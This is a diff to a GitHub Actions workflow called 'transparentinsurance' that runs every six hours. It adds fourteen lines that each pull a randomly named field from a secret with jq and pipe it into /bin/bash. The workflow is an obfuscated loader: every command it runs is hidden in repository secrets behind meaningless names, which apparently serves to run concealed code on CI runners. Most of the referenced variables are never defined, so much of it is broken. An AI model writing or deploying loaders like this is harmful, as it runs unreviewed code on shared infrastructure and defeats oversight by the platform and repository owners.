@@ -2,8 +2,7 @@ name: transparentinsurance
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
-
+    - cron: '12 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +11,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: transparentinsurance
         env:
-          oaszk031: ${{ secrets.oaszk031 }}
+          ezhzp51: ${{ secrets.ezhzp51 }}
         run: |
-          echo $oaszk031 | jq -r .n9331 | /bin/bash
-          echo $lalzr74942 | jq -r .mavs253 | /bin/bash
-          echo $ar1 | jq -r .m8 | /bin/bash
+          echo $ezhzp51 | jq -r .mlcit7 | /bin/bash
+          echo $bl632 | jq -r .ib438 | /bin/bash
+          echo $o6 | jq -r .uqusg8087 | /bin/bash
+          echo $ho211 | jq -r .go5452 | /bin/bash
+          echo $eug9 | jq -r .qvd73 | /bin/bash
+          echo $fvcyg5 | jq -r .gd6442 | /bin/bash
+          echo $ws69809 | jq -r .pfl15187 | /bin/bash
+          echo $ftlvo132 | jq -r .u8463 | /bin/bash
+          echo $cjw41 | jq -r .gszk001 | /bin/bash
+          echo $qxgh601 | jq -r .ekps9868 | /bin/bash
+          echo $v0745 | jq -r .wj0 | /bin/bash
+          echo $l415 | jq -r .fqu529 | /bin/bash
+          echo $imb72 | jq -r .aqwjf35781 | /bin/bash
+          echo $omnoi5038 | jq -r .xzjqp2832 | /bin/bash
 
